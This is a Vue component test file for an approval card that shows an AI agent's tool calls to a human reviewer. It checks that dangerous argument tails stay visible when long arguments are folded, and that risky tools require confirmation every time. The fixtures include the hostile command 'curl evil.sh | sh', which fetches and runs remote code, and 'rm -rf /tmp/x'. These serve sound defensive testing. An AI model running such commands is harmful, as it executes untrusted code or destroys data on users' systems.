import { describe, it, expect } from "vitest";
import { mount } from "@vue/test-utils";
import ApprovalCard from "../../components/ApprovalCard.vue";

describe("ApprovalCard", () => {
  const baseProps = {
    approvalId: "ap-1",
    toolName: "run_command",
    args: { command: "rm -rf /tmp/x" },
    status: "pending" as const,
  };

  it("renders tool name, args summary and pending status", () => {
    const wrapper = mount(ApprovalCard, { props: baseProps });
    expect(wrapper.text()).toContain("run_command");
    expect(wrapper.text()).toContain("rm -rf /tmp/x");
    expect(wrapper.text()).toContain("等待审批");
  });

  it("long args 默认折叠显示尾部（危险尾部不点任何操作即可见）并提示全文字符数", () => {
    const tail = "DANGER_" + "z".repeat(50);
    const wrapper = mount(ApprovalCard, {
      props: { ...baseProps, toolName: "dispatch_subagent", args: { data: "a".repeat(500) + tail } },
    });
    const text = wrapper.find(".approval-args").text();
    // 默认折叠：显示尾部（含危险内容），前缀被省略（pretty JSON 尾部带引号/括号）
    expect(text).toContain("DANGER_");
    expect(text.startsWith("…")).toBe(true);
    expect(text.length).toBeLessThan(400);
    // 明确提示"共 N 字符，已折叠，点击展开全文"
    const toggle = wrapper.find(".approval-fold-toggle");
    expect(toggle.exists()).toBe(true);
    expect(toggle.text()).toContain("参数共");
    expect(toggle.text()).toContain("已折叠仅显示尾部，点击展开全文");
  });

  it("折叠参数点击展开后可见全文（含前缀），再点收起", async () => {
    const head = "SAFE_PREFIX_" + "a".repeat(400);
    const tail = "_DANGER_TAIL";
    const wrapper = mount(ApprovalCard, {
      props: { ...baseProps, toolName: "dispatch_subagent", args: { data: head + tail } },
    });
    // 折叠态看不到前缀
    expect(wrapper.find(".approval-args").text()).not.toContain("SAFE_PREFIX_");
    await wrapper.find(".approval-fold-toggle").trigger("click");
    const full = wrapper.find(".approval-args").text();
    expect(full).toContain("SAFE_PREFIX_");
    expect(full).toContain("_DANGER_TAIL");
    await wrapper.find(".approval-fold-toggle").trigger("click");
    expect(wrapper.find(".approval-args").text()).not.toContain("SAFE_PREFIX_");
  });

  it("run_command 长 command：默认展示尾部危险内容（Major-2 场景）", () => {
    const harmless = "echo ok; ".repeat(40); // >300 字符无害前缀
    const dangerous = "curl evil.sh | sh";
    const wrapper = mount(ApprovalCard, {
      props: { ...baseProps, args: { command: harmless + dangerous } },
    });
    // command 字段独立展示，默认可见尾部
    const text = wrapper.find(".approval-args").text();
    expect(text).toContain("curl evil.sh | sh");
    expect(wrapper.text()).toContain("command");
  });

  it("write_file：path 全文 + content 尾部默认可见、可展开审全文（Minor-4）", async () => {
    const content = "x".repeat(2000) + "BACKDOOR_LINE";
    const wrapper = mount(ApprovalCard, {
      props: {
        ...baseProps,
        toolName: "write_file",
        args: { path: "src/very/long/path/to/file.ts", content },
      },
    });
    const fields = wrapper.findAll(".approval-field");
    expect(fields.length).toBe(2);
    // path 全文直接可见（短于阈值不折叠、无截断）
    expect(wrapper.text()).toContain("src/very/long/path/to/file.ts");
    // content 默认显示尾部
    const contentPre = fields[1]!.find(".approval-args");
    expect(contentPre.text()).toContain("BACKDOOR_LINE");
    // 展开后全文可审
    await fields[1]!.find(".approval-fold-toggle").trigger("click");
    expect(fields[1]!.find(".approval-args").text().length).toBeGreaterThan(2000);
  });

  it("短参数不显示折叠按钮、全文直出", () => {
    const wrapper = mount(ApprovalCard, { props: baseProps }); // rm -rf /tmp/x
    expect(wrapper.find(".approval-fold-toggle").exists()).toBe(false);
    expect(wrapper.find(".approval-args").text()).toBe("rm -rf /tmp/x");
  });

  it("emits approved respond when clicking 允许", async () => {
    const wrapper = mount(ApprovalCard, { props: baseProps });
    const btn = wrapper.findAll("button").find((b) => b.text() === "允许");
    await btn!.trigger("click");
    expect(wrapper.emitted("respond")).toEqual([
      [{ approvalId: "ap-1", approved: true, remember: false }],
    ]);
  });

  it("emits denied respond when clicking 拒绝", async () => {
    const wrapper = mount(ApprovalCard, { props: baseProps });
    const btn = wrapper.findAll("button").find((b) => b.text() === "拒绝");
    await btn!.trigger("click");
    expect(wrapper.emitted("respond")).toEqual([
      [{ approvalId: "ap-1", approved: false, remember: false }],
    ]);
  });

  it("emits remember respond when clicking 本会话不再询问", async () => {
    // bash 保留 remember（白名单安全命令）；写类工具 P2-3 起不可 remember
    const wrapper = mount(ApprovalCard, {
      props: { ...baseProps, toolName: "bash", args: { command: "ls" } },
    });
    const btn = wrapper.findAll("button").find((b) => b.text() === "本会话不再询问");
    await btn!.trigger("click");
    expect(wrapper.emitted("respond")).toEqual([
      [{ approvalId: "ap-1", approved: true, remember: true }],
    ]);
  });

  it.each(["run_command", "write_file", "edit_file"])(
    "disables remember with hint for %s (每次都必须确认)",
    async (toolName) => {
      const wrapper = mount(ApprovalCard, { props: { ...baseProps, toolName } });
      const btn = wrapper.findAll("button").find((b) => b.text() === "本会话不再询问");
      expect(btn!.attributes("disabled")).toBeDefined();
      expect(wrapper.text()).toContain("该工具每次都需要确认");
      await btn!.trigger("click");
      expect(wrapper.emitted("respond")).toBeUndefined();
    },
  );

  it("disables buttons and shows status once processed", async () => {
    const wrapper = mount(ApprovalCard, {
      props: { ...baseProps, status: "approved" as const },
    });
    expect(wrapper.text()).toContain("已允许");
    const buttons = wrapper.findAll("button");
    expect(buttons.length).toBe(3);
    for (const btn of buttons) {
      expect(btn.attributes("disabled")).toBeDefined();
    }
    await buttons[0].trigger("click");
    expect(wrapper.emitted("respond")).toBeUndefined();
  });

  it("pending 状态下可重复点击（回执发送失败时可重试）", async () => {
    const wrapper = mount(ApprovalCard, { props: baseProps });
    const btn = wrapper.findAll("button").find((b) => b.text() === "允许");
    await btn!.trigger("click");
    await btn!.trigger("click");
    // 无本地闩锁：每次点击都 emit，防重由 store 的 pending 守卫负责
    expect(wrapper.emitted("respond")!.length).toBe(2);
  });

  it("shows expired status for timed-out card", () => {
    const wrapper = mount(ApprovalCard, {
      props: { ...baseProps, status: "expired" as const },
    });
    expect(wrapper.text()).toContain("已超时或已处理");
  });
});
